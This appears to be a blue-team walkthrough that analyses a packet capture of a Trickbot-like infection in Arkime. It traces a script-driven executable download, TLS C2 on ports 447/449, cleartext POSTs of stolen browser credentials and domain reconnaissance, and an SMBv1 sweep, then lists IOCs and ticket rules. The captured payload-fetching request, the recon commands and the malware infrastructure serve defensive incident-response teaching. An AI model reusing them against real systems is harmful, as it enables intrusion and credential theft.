---
title: Arkime-Only Walkthrough — Script Downloader to Credential Theft, TLS C2 and an Incident Ticket
tags:
  - blue-team
  - pcap
  - arkime
  - cyberchef
  - trickbot
  - c2
  - credential-theft
  - ticket
---

# Arkime-Only Walkthrough — Script Downloader to Credential Theft, TLS C2 and an Incident Ticket { #arkime-only-walkthrough }

!!! abstract "Case summary"
    One Windows 10 workstation in the `mondogreek.com` domain fetched `YAS20.exe` with a script (no browser). Within 12 minutes it checked its public IP, opened encrypted C2 on ports **449** and **447**, downloaded more modules, **sent stolen browser passwords and a full reconnaissance dump in cleartext HTTP POSTs**, and swept the subnet on **SMB 445** (refused). The pattern is consistent with **Trickbot** (inferred; no hash lookup was possible offline). The whole case was solved **in the Arkime web UI only**, with CyberChef for decoding, and ends with a complete incident ticket.

| | |
|---|---|
| **Evidence** | One PCAP, 2020-03-11 21:22:35 – 22:06:41 UTC (44 min 06 s), 1,131 sessions |
| **Environment** | Closed network, no internet (no VirusTotal, no OSINT). Arkime v5.6.4 web UI + CyberChef (offline) |
| **Deliverable** | An incident ticket: index entry, description, impacted/external machines, search queries, evidence locations, operation log with matching tool output |
| **Related pages** | [Arkime offline PCAP guide](../../network/arkime/offline-pcap-guide.md) · [Arkime search syntax](../../network/arkime/search-syntax.md) · [Beaconing & C2](../../network/beaconing-c2.md) · [EternalBlue / SMBv1](../../adversary/eternalblue-smbv1.md) |

!!! tip "How to use this page"
    Every Arkime search is in a code block — use the **copy button** on the right of each block. The [copy-ready query sheet](#query-sheet) at the end collects them with `<placeholders>` for your next PCAP. Boxes marked **Question** are questions asked during the analysis, answered where they came up.

## Answers at a glance { #answers }

| Item | Answer | Status |
|---|---|---|
| Infected host | **10.3.11.194 LAPTOP-7XMV2SN**, user **otis.witherspoon**, MAC `b8:ca:3a:ec:3b:8f`, Windows 10 Pro build 18363 | Confirmed |
| First malicious event | **21:24:36 UTC** — `GET /YAS20.exe` from `bolton-tech[.]com` (50.87.248.17) by `WinHttp.WinHttpRequest.5` | Confirmed |
| Network | 10.3.11.0/24, gateway 10.3.11.1, DC/DNS/DHCP **10.3.11.3 Mondogreek-DC**, domain `mondogreek.com` | Confirmed |
| C2 | TLS to **190.214.13.2:449** (persistent), **185.14.31.98:447** (downloads, self-signed `example.com` cert), 185.180.198.50:447 (no answer); HTTP POST to **203.176.135.102:8082** | Confirmed |
| Exfiltration | 5 cleartext POSTs 21:36:52–21:38:49: browser credentials (IE, Firefox), process list, systeminfo, ipconfig, net, nltest output | Confirmed |
| Lateral movement | SMBv1-only probes to 10.3.11.119, .218, .1, .131, .254 at 21:36:47 and 21:37:17 — **all refused** | Confirmed (attempt failed) |
| Scope | No other internal host talked to any external IOC | Confirmed |
| Malware family | Trickbot-like (URI `/yas20/<host>_W10018363.<botid>/81/`, ports 447/449, `example.com` / "Global Security" cert, module-based theft) | Inferred |

---

## Step 0 — How Arkime shows the data { #step-0 }

Arkime does not list packets one by one. It groups them into **sessions**: one conversation between two endpoints, for example `10.3.11.194:51234 → 8.8.8.8:53`. Each session carries start/stop time, packets, bytes, protocols and, where parsed, HTTP/DNS/TLS fields.

The tabs you will use:

| Tab | Used for |
|---|---|
| **Sessions** | The list of sessions for a search. Click `+` to open the session detail and packets |
| **SPI View** | Every value of a field with its count — like `stats count by field` in Splunk |
| **Connections** | Who talks to whom, as a graph |
| **Settings** | Time zone (set it to **UTC**) |

!!! warning "Trap 1 — the time range"
    The time picker starts at **Last hour**. An older PCAP then shows **nothing**. Set it to **All** (or type Start/End) before the first search.

!!! warning "Trap 2 — the time zone"
    Arkime shows times in the **browser's time zone** by default. Tickets are written in UTC. Go to **Settings → General → Timezone Format → UTC**. The timeline axis then shows `UTC` after each time.

### Data start, end and session count { #data-range }

!!! question "Question: Arkime works in sessions — so how do I see when the data starts and ends?"
    Each session has a **Start Time** (first packet) and a **Stop Time** (last packet).

    - **Data start** = the earliest Start Time of all sessions.
    - **Data end** = the latest Stop Time of all sessions.

    1. Sessions tab, time range **All**, empty search, **Search**.
    2. Click the **Start Time** column header until it sorts **ascending** → the first row's Start Time is the data start.
    3. Click **Stop Time** until it sorts **descending** → the first row's Stop Time is the data end.

    Use Stop Time for the end, not Start Time descending: a long session (a download or a C2 channel) can start early and still end last.

    Other ways: the timeline bar chart (first and last bar, good for a rough view) and the **Files** tab (`First Date` of each imported PCAP, start only). The total count is shown above the list: `Showing 1 - 50 of 1,131 entries`.

Result for this PCAP:

```text
Start  2020/03/11 21:22:35 UTC
End    2020/03/11 22:06:41 UTC   (duration 00:44:06)
Sessions 1,131
```

---

## Step 1 — The big picture { #step-1 }

Empty search, then **SPI View → general**.

```text
Protocols  tcp (672)  udp (458)  tls (349)  dns (325)  http2 (126)  ldap (79)  krb5 (78)
           http (44)  dcerpc (41)  smb (30)  llmnr (29)  ssdp (16)  ntp (9)  mdns (8)  quic (6)  igmp (1)
Src IP     10.3.11.119 (491)  10.3.11.194 (377)  10.3.11.218 (259)  10.3.11.3 (3)  52.242.211.89 (1)
```

How to read it:

- **Internal network `10.3.11.0/24`.** Three busy hosts (.119, .194, .218) are workstations. `10.3.11.3` almost never starts a session: servers mostly **receive**, so it is a server candidate.
- **`ldap`, `krb5`, `dcerpc`, `smb`** = normal Active Directory traffic. SMB/DCERPC **between workstations** would be a lateral-movement sign — check later.
- **`llmnr`, `ssdp`, `mdns`, `igmp`** = Windows background noise.
- **`tls` + `http2`** are encrypted. **`http` (44)** is cleartext — the easiest place to start hunting.
- **`52.242.211.89` as a source** is odd (external hosts rarely start sessions) — checked in [step 3](#step-3).

### Confirm the DC { #dc }

```text
ip.dst == 10.3.11.3
```

`ip.dst` = destination IP field, `==` = equals. Result: 571 sessions, protocols `dns (325) ldap (79) krb5 (78) dcerpc (41) smb (24) ntp (9)`, sources = the three workstations. DNS + Kerberos + LDAP + RPC + SMB + NTP to one server = **domain controller / DNS**.

!!! tip "Fields that are not shown by default"
    In the general section, click the **Dst Port** field button to load its values. You would expect 53, 88, 389, 135, 445.

---

## Step 2 — Hostnames and users from Kerberos { #step-2 }

Tickets need **IP + hostname**. Kerberos carries both computer and user account names.

```text
ip.src == 10.3.11.0/24 && protocols == krb5
```

| Part | Meaning |
|---|---|
| `ip.src == 10.3.11.0/24` | Source is any internal host (CIDR is accepted) |
| `&&` | AND — both conditions must match |
| `protocols == krb5` | Kerberos sessions only |

!!! question "Question: the krb5 section only shows field names (cname, Realm, sname…), no values. What do I do?"
    SPI View loads **field names first** and values only on request (for speed). The buttons `cname`, `Realm`, `sname` are fields, not values.

    - Click the **field name** (e.g. `cname`) to load that field, or
    - Click **Load All** on the right of the section to load every field in it.

    `cname Cnt`, `Realm Cnt` and other `Cnt` fields only count values per session — ignore them for now.

Result:

```text
cname  laptop-i9zpi04$ (8)  otis.witherspoon (6)  laptop-7xmv2sn$ (4)  laptop-sqsa42o$ (4)
       dominga.mcdowell (2)  dorian.neff (2) …
Realm  MONDOGREEK.COM (62)  MONDOGREEK (8)  mondogreek.com (8)
sname  krbtgt/MONDOGREEK.COM (26)  cifs/Mondogreek-DC.mondogreek.com (9)
       ldap/Mondogreek-DC.mondogreek.com (6)  host/laptop-7xmv2sn.mondogreek.com (2) …
```

- **cname ending in `$`** = computer account (hostname). Without `$` = user account.
- **Realm** = domain. **sname** = the service requested: `krbtgt/…` logon ticket, `cifs/…` file sharing, `ldap/…` directory. `cifs/Mondogreek-DC…` gives the **DC name**.

To pair names with IPs, click a cname value → **and** (adds `krb5.cname == "…"` to the search) → search → read **Src IP**. Or search per IP: `ip.src == 10.3.11.194 && protocols == krb5`.

| IP | Hostname | User |
|---|---|---|
| 10.3.11.3 | Mondogreek-DC | — |
| 10.3.11.119 | LAPTOP-SQSA42O | dorian.neff |
| 10.3.11.194 | LAPTOP-7XMV2SN | otis.witherspoon |
| 10.3.11.218 | LAPTOP-I9ZPI04 | dominga.mcdowell |

---

## Step 3 — Rule out the external "initiator" { #step-3 }

```text
ip.src == 52.242.211.89
```

One session: `52.242.211.89:443 → 10.3.11.194:50355`, 2 packets, 21:32:00. Read the detail:

| Field | Value | Meaning |
|---|---|---|
| TCP Flags | `SYN 0 SYN-ACK 0 PSH 1 RST 1` | No handshake seen — the connection **started before the capture** |
| Ports | 443 → 50355 | 443 = server, 50355 = client ephemeral port. The laptop was really the client |
| Flow | server PSH → client RST | Server sent data on a connection the client had already closed |
| Payload | unreadable | Encrypted TLS record |
| MACs | Src Netgear, Dst Dell | External IPs always arrive via the **gateway's** MAC |

Arkime calls whoever sent the first **captured** packet the source. **Not inbound, benign** (`ARIN`, Microsoft Azure range). Record it as checked and **Not Found** — ruling things out belongs in the ticket too.

---

## Step 4 — Sweep the cleartext HTTP { #step-4 }

```text
ip.src == 10.3.11.0/24 && protocols == http
```

SPI View → **http** → **Load All**. The fields that matter:

| Field | Why |
|---|---|
| Hostname (`host.http`) | Which site |
| URI | Path and file name |
| Request Method | `GET` fetch, `POST` send. Outbound POSTs = exfil/C2 candidates |
| Status Code | 200, 404 … |
| Useragent | Which program asked. Non-browser values are suspicious |
| **Body Magic** | The **real** file type of the body. `application/x-dosexec` = Windows EXE/DLL, whatever the name says |

**Remove the noise first:** `ctldl.windowsupdate.com`, `ocsp.digicert.com`, `crl.securetrust.com` (UA `Microsoft-CryptoAPI/10.0`), `fonts.googleapis.com`, `fonts.gstatic.com`, `*.wsimg.com`, and sites browsed with the real Edge/Chrome User-Agent.

What is left:

| Clue | Value | Why suspicious |
|---|---|---|
| EXE download | `bolton-tech.com/YAS20.exe`, Body Magic `application/x-dosexec (2)`, response `application/x-msdownload` | Executable over plain HTTP |
| Raw-IP "images" | `64.44.133.131/images/cursor.png (2)`, `/images/imgpaper.png (1)` | No domain; a second `x-dosexec` exists |
| C2-looking URI | `203.176.135.102:8082/yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB…CAED6/81/ (4)`, `/90 (1)` | Raw IP, port 8082, **victim hostname + Windows build + bot ID** in the URI |
| IP check | `checkip.amazonaws.com/` | Malware checks its public IP right after infection |
| User-Agents | `KSKJJGJ`, `WinHTTP loader/1.0`, `WinHttp.WinHttpRequest.5`, `MSIE 7.0; Windows NT 10.0` (4) | Not browsers; IE 7 on Windows 10 is impossible |
| Counts | `GET 39`, `POST 5`, `multipart/form-data` × 5 | 4 + 1 C2 URIs = 5 POSTs = 5 uploads |

---

## Step 5 — Put the suspicious HTTP on a timeline { #step-5 }

```text
host.http == bolton-tech.com || ip.dst == 64.44.133.131 || ip.dst == 203.176.135.102 || host.http == checkip.amazonaws.com
```

`||` = OR (any one matches). No source filter on purpose — the result tells you **which host** did it. Sort **Start Time ascending**.

All 9 sessions come from **10.3.11.194**:

```text
21:24:36  10.3.11.194:49727 → 50.87.248.17:80     GET bolton-tech.com/YAS20.exe
21:32:00  10.3.11.194:49787 → 18.235.112.207:80   GET checkip.amazonaws.com/
21:36:45  10.3.11.194:49816 → 64.44.133.131:80    GET /images/cursor.png + /images/imgpaper.png  (1.2 MB)
21:36:52  10.3.11.194:50080 → 203.176.135.102:8082  /81/
21:36:55  10.3.11.194:50081 → 203.176.135.102:8082  /81/
21:36:57  10.3.11.194:50082 → 64.44.133.131:80    GET /images/cursor.png  (611 KB)
21:36:59  10.3.11.194:50091 → 203.176.135.102:8082  /90
21:37:19  10.3.11.194:50098 → 203.176.135.102:8082  /81/
21:37:52  10.3.11.194:50099 → 203.176.135.102:8082  /81/   (no more HTTP to these IPs afterwards)
```

### The YAS20.exe session { #yas20 }

Request (Source side):

```http
GET /YAS20.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
Host: bolton-tech.com
```

- Only four headers, **no Referer, no Accept-Language**: not a person clicking in a browser.
- `WinHttp.WinHttpRequest.5` is the Windows COM object used by **VBScript, JScript, PowerShell and Office macros**. A script fetched the EXE → initial access via a malicious script or document (inferred).

Response (Destination side): `Content-Type: application/x-msdownload`, `Content-Length: 466944`, `Server: Apache`, `Last-Modified: Tue, 10 Mar 2020` (uploaded the day before), and an odd header:

```text
host-header: c2hhcmVkLmJsdWVob3N0LmNvbQ==
```

!!! example "CyberChef: From Base64"
    A trailing `==` is typical Base64. **From Base64** gives `shared.bluehost.com` — a shared web-hosting platform, so `bolton-tech.com` is most likely a **compromised ordinary site** used as a file host.

---

## Step 6 — Downloaded files: type and hashes { #step-6 }

```text
host.http == bolton-tech.com || ip.dst == 64.44.133.131
```

SPI View → http:

```text
Body Magic  application/x-dosexec (2)
Body MD5    179345004c39336eaba39863b95f268b  9dfb3952172deeddb3a5e3cafed933bc  e40d7846eae7d8a98c0e3512e5461e4c
```

The "png" responses from 64.44.133.131:

```http
HTTP/1.1 200 OK
Server: nginx/1.6.2
Content-Type: Content-type: application/octet-stream
Content-Length: 582656
```

- ~570 KB each — far too big for a cursor image.
- `Content-Type: Content-type: …` — header name repeated: a hand-made malicious server, not a normal web server.
- Requests used User-Agent `WinHTTP loader/1.0` with the raw IP as Host.

**Disguised executables, likely.** Arkime computed the **Body MD5** of each HTTP body. They cannot be looked up offline, but they go into the ticket as IOCs for malware analysis. (Per-file mapping of the three MD5s was not confirmed — open each session's HTTP section to pair them.)

!!! tip "Confirm a file type by its bytes"
    Open the session and look at the Destination body: a real PNG starts with `‰PNG`; a Windows PE starts with `MZ` and contains `This program cannot be run in DOS mode`. Or download the body and use CyberChef **Detect File Type**.

---

## Step 7 — Read what was uploaded { #step-7 }

!!! question "Question: how did you know the 21:36:59 session was a POST?"
    At first it was **inferred, not seen**: SPI View showed `POST (5)`, `multipart/form-data` × 5 and the C2 URIs `/81/` × 4 + `/90` × 1 = 5. Every other HTTP request was a GET for images, fonts and scripts.

    SPI View only counts values; it does **not** say which session holds which value, and the Info column shows the URI but not the method. So it must be checked before it goes in a ticket:

    ```text
    http.method == POST
    ```

    5 results, all `10.3.11.194 → 203.176.135.102:8082` = inference confirmed. The session detail also shows `Method POST (1)`.

The `/90` session: `POST …/90`, User-Agent **`KSKJJGJ`**, `multipart/form-data; boundary=aksgja8s8d8a8s97`, `Content-Length: 5366`. **Src databytes 5,609 vs Dst 120** → upload. The server answered `200`, `server: Cowboy`, body `/1/` (3 bytes, an acknowledgement).

!!! question "Question: I switched `natural` to `ascii`, but the body still shows only a blue link `90`. Why?"
    `natural` / `ascii` / `utf8` / `hex` only change **how bytes are printed**. The link comes from a separate option that turns HTTP bodies into downloadable files.

    1. **Packet Options ▾ → Hide Images & Files** (or untick *Show Images & Files*). The body is then printed inline; `ascii` or `hex` now apply.
    2. Or click **Source Raw** at the top of the session — it downloads everything the client sent (headers + body) as one file. Open it in CyberChef (**Open file as input**); if it looks garbled, add **Strings**.
    3. Clicking the blue link itself also downloads just that body.

### `/90` — reconnaissance dump { #post-90 }

The multipart body has two parts, split by `--aksgja8s8d8a8s97`, each with `name="…"`:

```text
--aksgja8s8d8a8s97
Content-Disposition: form-data; name="proclist"

***TASK LIST***
[System Process]
System
…
MsMpEng.exe            ← Defender was running
…
VMMM;;;;영상ثافوزبت.exe   ← nonsense name mixing Latin, Korean and Arabic: likely the malware process
…
--aksgja8s8d8a8s97
Content-Disposition: form-data; name="sysinfo"

***S Y S T E M I N F O***
HostName: LAPTOP-7XMV2SN
OSName: Microsoft Windows 10 Pro
…
/c ipconfig /all
/c net config workstation
/c net view /all                     → System error 6118
/c net view /all /domain             → System error 6118
/c nltest /domain_trusts
/c nltest /domain_trusts /all_trusts
***LOCAL MACHINE DATA***
User name: CN=Otis Witherspoon,CN=Users,DC=mondogreek,DC=com
Domain controller: Mondogreek-DC.mondogreek.com
Admin Name: Administrator
--aksgja8s8d8a8s97--
```

- `/c …` = commands run through `cmd.exe /c`.
- `nltest /domain_trusts` and admin-name lookups = mapping the **whole domain**, preparation for lateral movement.
- Cross-check: the MAC in the ipconfig output (`B8-CA-3A-EC-3B-8F`) equals the Src Ethernet MAC Arkime shows for 10.3.11.194. Host evidence and network evidence agree.

### `/81/` — stolen credentials, one POST per source { #post-81 }

```text
http.method == POST && ip.dst == 203.176.135.102 && http.uri == *81*
```

| Time | Content-Length | `source` part | `data` part |
|---|---|---|---|
| 21:36:52 | 274 | `IE passwords` | <code>https://www.facebook.com/&#124;otis.witherspoon@mondogreek.com&#124;P@ss********</code> |
| 21:36:55 | 551 | `firefox passwords` | Firefox account tokens (`keyFetchToken`, `unwrapBKey`) + <code>https://accounts.firefox.com&#124;otis.witherspoon@mondogreek.com&#124;&lt;same password&gt;</code> |
| 21:37:19 | 219 | `OpenVPN passwords and configs` | empty |
| 21:37:52 | 210 | `OpenSSH private keys` | empty |

- `data` = `URL | username | password`, in **cleartext**.
- The **same password** on two sites → the domain account is at high risk of reuse.
- Firefox tokens can give access to synced data until the account sessions are revoked.
- Empty `data` = nothing found; useful for the responders (no VPN/SSH key rotation needed).
- `/81/` = credential reports, `/90` = recon reports — the URI number names the data type. All four `/81/` posts used the fake `MSIE 7.0; Windows NT 10.0` User-Agent; `/90` used `KSKJJGJ`.

!!! danger "Mask secrets in tickets"
    Writing a stolen password into a ticket leaks it again to everyone who reads the ticket. Mask it (`P@ss********`) and point to the evidence PCAP.

---

## Step 8 — Hunt the hidden (encrypted) C2 { #step-8 }

The HTTP reports stop at 21:37:52 but the capture runs to 22:06. Malware like this keeps a **TLS channel** open.

### Unusual ports { #unusual-ports }

```text
ip.src == 10.3.11.194 && ip.dst != 10.0.0.0/8 && port.dst != 80 && port.dst != 443 && port.dst != 53
```

`!=` = not equal. External destinations only, without web and DNS ports.

```text
Dst IP     190.214.13.2 (6)  224.0.0.252 (6)  203.176.135.102 (5)  185.14.31.98 (3)
           239.255.255.250 (3)  224.0.0.251 (2)  185.180.198.50 (1)
Protocols  tcp (15)  udp (11)  tls (9)  llmnr (6)  http (5)  ssdp (3)  mdns (2)
```

- `224.x` / `239.x` are **multicast** (LLMNR, SSDP, mDNS), not internet servers. Next time add `&& ip.dst != 224.0.0.0/4`.
- **`tls (9)` on non-443 ports** to raw IPs 190.214.13.2, 185.14.31.98, 185.180.198.50 = the hidden channel.

### Certificates { #certificates }

```text
ip.src == 10.3.11.194 && protocols == tls
```

SPI View → **cert** → Load All. Most issuers are Microsoft, Baltimore CyberTrust, DigiCert, Let's Encrypt (normal Windows traffic). Out of place:

```text
Issuer/Subject CN   example.com (4)
Issuer/Subject ON   Global Security (4)     Org Unit  IT Department (4)
Issuer/Subject ON   Internet Widgits Pty Ltd (2)
Subject CN          filmstore.xyz (1)  hakunamatatata.com (1)  helpforyourservice.com (1)
```

!!! question "Question: what are Issuer CN / ON and Subject CN / ON?"
    A certificate is an ID card for a server:

    - **Subject** = **who the certificate belongs to** (e.g. `www.bing.com`).
    - **Issuer** = **who checked and signed it** (e.g. `Microsoft IT TLS CA 5`).

    Inside each: **CN** (Common Name — for websites usually the domain), **ON** (Organization Name — standard name `O`, Arkime shows `ON`), **OU / Org Unit** (department).

    Certificates form a **chain**:

    ```text
    [cert 3] Subject: Baltimore CyberTrust Root   Issuer: Baltimore CyberTrust Root   ← root, signs itself
         ↓ signs
    [cert 2] Subject: Microsoft IT TLS CA 5       Issuer: Baltimore CyberTrust Root   ← intermediate
         ↓ signs
    [cert 1] Subject: www.bing.com                Issuer: Microsoft IT TLS CA 5       ← the website
    ```

    Servers usually send cert 1 and 2; the root is already in Windows. That is why `microsoft it tls ca 5` appears in **both** Issuer CN (49) and Subject CN (49), while `baltimore cybertrust root` appears only as an Issuer.

!!! question "Question: how did you decide issuer and subject were the same?"
    At first by **SPI View counts**: `example.com` was in Issuer CN (4) and Subject CN (4), "Global Security", "IT Department" and "Internet Widgits" likewise. That is a hint, **not proof** — `let's encrypt authority x3` also appears 2 + 2 because of the chain (issuer of cert A, subject of cert B).

    A self-signed certificate has issuer = subject **inside one certificate**:

    ```text
    self-signed:  [one cert]  Subject example.com  /  Issuer example.com    ← equal in the same cert
    normal chain: [cert A]    Subject site         /  Issuer CA X
                  [cert B]    Subject CA X         /  Issuer root           ← equal across two certs
    ```

    Verify in the session detail: the **Certificate** block lists each certificate separately. Check (1) how many certificates (self-signed is usually **one**) and (2) whether issuer = subject in that one. Arkime also tags sessions automatically: **`cert:self-signed`** or **`cert:certificate-authority`**.

    ```text
    tags == "cert:self-signed"
    ```

Why the odd values matter: `example.com` is a **reserved documentation domain** no real service can get a certificate for; "Global Security / IT Department" are generic made-up names (this combination is widely reported on Trickbot C2 certificates); **Internet Widgits Pty Ltd** is the OpenSSL default when nobody fills in the fields.

---

## Step 9 — TLS timeline and C2 assessment { #step-9 }

```text
ip.src == 10.3.11.194 && (ip.dst == 190.214.13.2 || ip.dst == 185.14.31.98 || ip.dst == 185.180.198.50 || cert.issuer.cn == example.com || cert.issuer.on == "Internet Widgits Pty Ltd" || cert.subject.cn == [filmstore.xyz, hakunamatatata.com, helpforyourservice.com])
```

| Part | Meaning |
|---|---|
| `( … )` | Grouping. Without it, `&&` and `||` can combine the wrong way ("this host AND IP-1" **or** "any host with an example.com cert") |
| `cert.issuer.cn`, `cert.issuer.on`, `cert.subject.cn` | Certificate issuer name, issuer org, subject name |
| `[a, b, c]` | List — any of these |
| `"…"` | Quote values that contain spaces |

14 sessions, all from 10.3.11.194 (sorted ascending):

```text
21:31:58  45.148.120.153:443   filmstore.xyz (CA-signed, cPanel)            62 KB
21:31:59  51.254.164.244:443   cert:self-signed                             61 KB
21:32:07  190.214.13.2:449     tls                                           8 KB  ← first C2
21:35:31  185.180.198.50:447   tcp only, 6 packets, 0 databytes  (no answer)
21:35:53  185.14.31.98:447     cert:self-signed (example.com)             2.1 MB  ← big download
21:35:55  190.214.13.2:449     tls, ~4 min                                  28 KB
21:35:58  190.214.13.2:449     tls, ~3.5 min                                23 KB
21:37:01  190.214.13.2:449     tls                                           8 KB
21:42:12  190.214.13.2:449     tls, ~4 min                                  11 KB
21:42:13  185.14.31.98:447     cert:self-signed                             25 KB
21:42:17  190.214.13.2:449     tls, ~4 min                                   8 KB
21:43:40  199.247.13.144:443   hakunamatatata.com (CA-signed)              570 KB
21:43:51  209.97.130.197:443   helpforyourservice.com (CA-signed)          281 KB
21:44:02  185.14.31.98:447     cert:self-signed  Src 2,185 B / Dst 111,326 B (download)
21:46:06  last session ends — nothing more until 22:06:41
```

Verified certificate on 185.14.31.98:447 (21:44:02 session):

```text
TLSv1.2  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
JA3  72a589da586844d7f0818ce684948eea   JA3S  e35df3e00ca4ef31d42b34bebaa2f86e
JA4  t12i190700_d83cc789557e_16bbda4055b2
Serial 008be295cd71603289   Not Before 2020/03/06 09:53:10 UTC   Not After 2021/03/06 (365 days)
Issuer  CN example.com  O Global Security  OU IT Department
Subject CN example.com  O Global Security  OU IT Department     ← one certificate, equal → self-signed
```

Created **5 days before** the incident: fresh attack infrastructure.

| Destination | Role | Reasoning |
|---|---|---|
| 190.214.13.2:449 | **Main C2** | Rare port, raw IP, connections held open 1–4 min, only 8–28 KB each |
| 185.14.31.98:447 | **Module download** | 2.1 MB right before the credential and recon reports began; 21:44 session clearly server → client |
| 185.180.198.50:447 | **Dead C2** | SYN retries, no answer. Still an IOC — it may come back |
| filmstore.xyz, 51.254.164.244, hakunamatatata.com, helpforyourservice.com (443) | **Suspicious downloads** | Appear right after infection and inside the C2 activity, odd domains; content unknown (encrypted) |

!!! info "Two kinds of beacon"
    A beacon can be **short and frequent** (a connection every N seconds, regular interval — what you look for with interval math) or **long-held** (the connection stays open and waits for commands, irregular start times, small byte counts). 190.214.13.2:449 is the second kind.

---

## Step 10 — Scope: lateral movement and other victims { #step-10 }

### Did the host try to spread? { #lateral }

```text
ip.src == 10.3.11.194 && ip.dst == 10.3.11.0/24 && ip.dst != 10.3.11.3
```

Internal destinations, without the DC (talking to the DC is normal).

```text
UDP 137/138 → 10.3.11.255   single packets at 21:23, 21:27, 21:35, 21:47, 21:59   (normal NetBIOS)
UDP 137/138 → 10.3.11.255   burst 21:36:19–21:37:21 (22 + 21 packets)             (= "net view" from the /90 dump)
TCP 445 at 21:36:47 (same second, src ports 49818…49929):
    → 10.3.11.119  smb ×3 (5 pkts, 51 databytes) + 1 no data
    → 10.3.11.218  smb ×2 (5 pkts, 51 databytes) + 1 no data
    → 10.3.11.1    2 pkts, 0 databytes
    → 10.3.11.254  1 pkt     → 10.3.11.131  1 pkt     (no answer: probably no host there)
TCP 445 at 21:37:17 → 10.3.11.119, 10.3.11.218  smb (5 pkts, 51 databytes)
```

- `10.3.11.255` is the subnet **broadcast**; 137/138 is NetBIOS. The burst matches the `net view /all` command seen in the upload — host evidence and network evidence at the same moment.
- Five addresses on **445 in one second** with sequential source ports = a **scan**, not a person.

Open one SMB session (21:37:17, `10.3.11.194:50097 → 10.3.11.119:445`):

```text
TCP Flags  SYN 1  SYN-ACK 1  ACK 1  PSH 1  RST 1
Src payload  "\xffSMBr … NT LM 0.12"     ← SMBv1 Negotiate Protocol Request, SMBv1 dialect only
Dst          2 packets, 120 bytes, 0 databytes  (SYN-ACK + RST, no SMB reply)
```

The target **refused SMBv1** (disabled on Windows 10). No share, user or file. SMBv1-only probing is typical of EternalBlue-style worm spreading ([EternalBlue / SMBv1](../../adversary/eternalblue-smbv1.md)). **Attempted, not successful.**

### Did any other host talk to the IOCs? { #other-victims }

```text
ip.dst == [50.87.248.17, 64.44.133.131, 203.176.135.102, 190.214.13.2, 185.14.31.98, 185.180.198.50, 51.254.164.244, 45.148.120.153, 199.247.13.144, 209.97.130.197] && ip.src != 10.3.11.194
```

**0 sessions.** Only LAPTOP-7XMV2SN is infected; .119 and .218 show no sign of compromise in the network data.

---

## Timeline { #timeline }

| UTC (2020-03-11) | Event |
|---|---|
| 21:22:35 | Capture starts |
| 21:24:36 | Script (`WinHttp.WinHttpRequest.5`) downloads `YAS20.exe` from bolton-tech[.]com |
| 21:31:58–59 | TLS to filmstore[.]xyz and 51.254.164.244 (self-signed) |
| 21:32:00 | Public IP check, checkip.amazonaws[.]com |
| 21:32:07 | First TLS C2 session to 190.214.13.2:449 |
| 21:35:31 | C2 attempt to 185.180.198.50:447 — no answer |
| 21:35:53 | 2.1 MB download from 185.14.31.98:447 |
| 21:36:19–21:37:21 | NetBIOS burst (`net view`) |
| 21:36:45–21:37:28 | "PNG" downloads from 64.44.133.131 |
| 21:36:47, 21:37:17 | SMBv1 sweep of 445 — refused |
| 21:36:52–21:37:52 | Four `/81/` credential POSTs to 203.176.135.102:8082 |
| 21:36:59–21:38:49 | `/90` reconnaissance POST (5,366 bytes) |
| 21:42–21:46 | More C2 (449) and downloads (447, 443) |
| 21:46:06 | Last malicious session ends |
| 22:06:41 | Capture ends |

## Indicators of compromise { #iocs }

| Type | Indicator | Role |
|---|---|---|
| URL | `hxxp://bolton-tech[.]com/YAS20.exe` | First-stage download |
| IP | `50.87.248[.]17` | bolton-tech.com (shared hosting) |
| URL | `hxxp://64.44.133[.]131/images/cursor.png`, `/images/imgpaper.png` | Disguised payloads |
| URL | `hxxp://203.176.135[.]102:8082/yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/81/` (`/90`) | HTTP exfiltration |
| IP:port | `190.214.13[.]2:449` | TLS C2 |
| IP:port | `185.14.31[.]98:447` | TLS download, self-signed cert |
| IP:port | `185.180.198[.]50:447` | C2 (no answer) |
| IP | `51.254.164[.]244` | TLS 443, self-signed |
| Domain/IP | `filmstore[.]xyz` 45.148.120[.]153, `hakunamatatata[.]com` 199.247.13[.]144, `helpforyourservice[.]com` 209.97.130[.]197 | Suspicious TLS downloads |
| Certificate | CN `example.com`, O `Global Security`, OU `IT Department`, serial `008be295cd71603289` | C2 server certificate |
| JA3 / JA3S | `72a589da586844d7f0818ce684948eea` / `e35df3e00ca4ef31d42b34bebaa2f86e` | Client/server TLS fingerprints (JA3 of Windows APIs can be shared by legitimate software) |
| MD5 | `179345004c39336eaba39863b95f268b`, `9dfb3952172deeddb3a5e3cafed933bc`, `e40d7846eae7d8a98c0e3512e5461e4c` | HTTP bodies of the three downloads |
| User-Agent | `KSKJJGJ`, `WinHTTP loader/1.0`, `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)` | Malware modules |
| Process | `VMMM;;;;영상ثافوزبت.exe` | Host IOC from the uploaded process list |
| Domain | `checkip.amazonaws[.]com` | Legitimate service abused for IP discovery (context only) |

## ATT&CK mapping { #attack }

| Technique | Evidence |
|---|---|
| T1059 Command and Scripting Interpreter | `WinHttp.WinHttpRequest.5` download (script inferred) |
| T1105 Ingress Tool Transfer | YAS20.exe, "png" payloads, 447/443 downloads |
| T1016.001 Internet Connection Discovery | checkip.amazonaws.com |
| T1057, T1082, T1016, T1482, T1087 Discovery | proclist, systeminfo, ipconfig, net, nltest, admin names |
| T1555.003 Credentials from Web Browsers | `/81/` IE and Firefox passwords |
| T1071.001 Web Protocols, T1573 Encrypted Channel | HTTP 8082 and TLS 449/447 C2 |
| T1041 Exfiltration Over C2 Channel | `/81/`, `/90` POSTs |
| T1021.002 SMB/Windows Admin Shares (attempt) | SMBv1 sweep of 445, refused |

---

## The incident ticket { #ticket }

The ticket follows a standard team template. Rules worth remembering:

- **Description: no more than two paragraphs**, but it must name internal IPs + hostnames, external IPs + domains, protocol and port, direction, file names, a maliciousness verdict with malware type, and life-cycle stages (C2 interval and state, exfil time / what / bytes / method).
- **Search queries** must be specific enough to return only the traffic of interest on a live network.
- **Operation log:** one line per action, ending with **Found / Not Found / Further Analysis Required**, each with a unique `[time, operator]` stamp.
- **Tool output / notes:** the **same stamp** as its log line (Ctrl+F finds both), with timestamps, source/destination and all interesting fields.
